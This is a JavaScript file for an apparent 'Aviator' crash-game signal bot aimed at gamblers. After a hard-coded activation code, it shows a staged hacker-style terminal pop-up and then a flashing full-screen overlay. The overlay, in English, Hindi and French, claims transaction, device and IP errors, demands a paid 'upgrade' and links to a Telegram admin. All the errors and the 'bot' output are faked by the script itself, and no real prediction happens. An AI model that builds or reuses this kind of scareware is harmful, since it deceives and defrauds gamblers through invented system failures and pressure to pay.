let selectedLang = "en";
let selectedCountry = "";
let selectedSite = "";

// 🌍 Multilingual messages
const messages = {
    en: {
        systemOverride: "🚨 SYSTEM OVERRIDE: UPGRADE REQUIRED 🚨",
        multipleTransactions: "❌ Multiple Transactions Detected",
        oneTransactionOnly: "⚠️ You MUST make only ONE transaction",
        deviceIPMismatch: "❌ Device & IP mismatch",
        sameDevice: "⚠️ Use the same device and keep the same IP address",
        packageFail: "❌ Package authentication failed",
        upgradeNow: "⚠️ Upgrade required to unlock access",
        contactAdmin: "🚨 CONTACT ADMIN IMMEDIATELY"
    },
    hi: {
        systemOverride: "🚨 सिस्टम ओवरराइड: अपग्रेड आवश्यक 🚨",
        multipleTransactions: "❌ कई लेनदेन का पता चला",
        oneTransactionOnly: "⚠️ केवल एक ही लेनदेन करें",
        deviceIPMismatch: "❌ डिवाइस और IP मेल नहीं खा रहे",
        sameDevice: "⚠️ वही डिवाइस और वही IP बनाए रखें",
        packageFail: "❌ पैकेज प्रमाणीकरण विफल",
        upgradeNow: "⚠️ एक्सेस अनलॉक करने के लिए अपग्रेड करें",
        contactAdmin: "🚨 तुरंत ADMIN से संपर्क करें"
    },
    fr: {
        systemOverride: "🚨 DÉPASSEMENT SYSTÈME : MISE À NIVEAU REQUISE 🚨",
        multipleTransactions: "❌ Transactions multiples détectées",
        oneTransactionOnly: "⚠️ Vous DEVEZ effectuer UNE SEULE transaction",
        deviceIPMismatch: "❌ Incohérence entre l'appareil et l'adresse IP",
        sameDevice: "⚠️ Utilisez le même appareil et gardez la même IP",
        packageFail: "❌ Échec de l’authentification du forfait",
        upgradeNow: "⚠️ Mise à niveau requise pour débloquer l'accès",
        contactAdmin: "🚨 CONTACTEZ L’ADMIN IMMÉDIATEMENT"
    }
};

function setLanguage(langCode) {
    selectedLang = langCode;
}

function startApp() {
    document.getElementById("startScreen").style.display = "none";
    document.getElementById("languageScreen").style.display = "block";
}

function selectCountry(country) {
    selectedCountry = country;
    document.getElementById("languageScreen").style.display = "none";
    document.getElementById("siteScreen").style.display = "block";
}

function selectSite(site) {
    selectedSite = site;
    document.getElementById("siteScreen").style.display = "none";
    document.getElementById("activationScreen").style.display = "block";
}

function validateCode() {
    const code = document.getElementById("activationCode").value.trim();
    if (code === "GRN250") {
        document.getElementById("activationScreen").style.display = "none";
        document.getElementById("signalScreen").style.display = "block";
    } else {
        alert("❌ Invalid Activation Code");
    }
}

function getSignal() {
    document.getElementById("signalButton").style.display = "none";
    document.getElementById("loadingAnimation").style.display = "block";

    setTimeout(() => {
        document.getElementById("loadingAnimation").style.display = "none";
        document.getElementById("errorMessages").style.display = "block";

        setTimeout(() => {
            const newWindow = window.open("", "_blank", "width=600,height=400");
            newWindow.document.write(`
                <style>
                    body {
                        background: black;
                        color: #0f0;
                        font-family: monospace;
                        padding: 20px;
                        animation: flicker 1s infinite alternate;
                    }
                    @keyframes flicker {
                        0% { opacity: 1; }
                        100% { opacity: 0.85; }
                    }
                </style>
                <pre>
C:\\Users\\Admin> ./aviator-bot.exe
[+] Fetching live signals...
[+] Analyzing crash patterns...
[!] Unstable connection detected...
[!] VPN Proxy Error...
[!] Device mismatch - ZaydBot triggering override...
                </pre>
            `);

            setTimeout(() => {
                showUrgentUpgradeWarning();
            }, 5000);

        }, 10000);

    }, 3000);
}

function showUrgentUpgradeWarning() {
    const body = document.body;

    const overlay = document.createElement("div");
    overlay.id = "urgentCodeWindow";
    overlay.style.position = "fixed";
    overlay.style.top = "0";
    overlay.style.left = "0";
    overlay.style.width = "100vw";
    overlay.style.height = "100vh";
    overlay.style.background = "radial-gradient(circle, black, #111)";
    overlay.style.color = "#ff0033";
    overlay.style.fontFamily = "'Courier New', Courier, monospace";
    overlay.style.zIndex = "9999";
    overlay.style.padding = "60px 40px";
    overlay.style.overflowY = "auto";
    overlay.style.animation = "glitchFlash 1s infinite alternate";

    overlay.innerHTML = `
        <style>
            @keyframes glitchFlash {
                0% { text-shadow: 0 0 5px #f00, 0 0 10px #f00; }
                100% { text-shadow: 0 0 10px #0f0, 0 0 20px #0f0; }
            }
            #urgentCodeWindow h1, #urgentCodeWindow h2 {
                font-size: 2.2em;
                animation: glitch 1s infinite;
            }
            @keyframes glitch {
                0% { transform: translate(0); }
                20% { transform: translate(-2px, 2px); }
                40% { transform: translate(2px, -2px); }
                60% { transform: translate(-1px, 1px); }
                80% { transform: translate(1px, -1px); }
                100% { transform: translate(0); }
            }
        </style>
        <h1>${messages[selectedLang].systemOverride}</h1>
        <p>${messages[selectedLang].multipleTransactions}</p>
        <p>${messages[selectedLang].oneTransactionOnly}</p>
        <p>${messages[selectedLang].deviceIPMismatch}</p>
        <p>${messages[selectedLang].sameDevice}</p>
        <p>${messages[selectedLang].packageFail}</p>
        <h2 style="color: yellow;">${messages[selectedLang].upgradeNow}</h2>
        <a href="https://t.me/zayd0011" style="color: cyan; font-size: 22px;">${messages[selectedLang].contactAdmin}</a>
    `;
    body.appendChild(overlay);
}
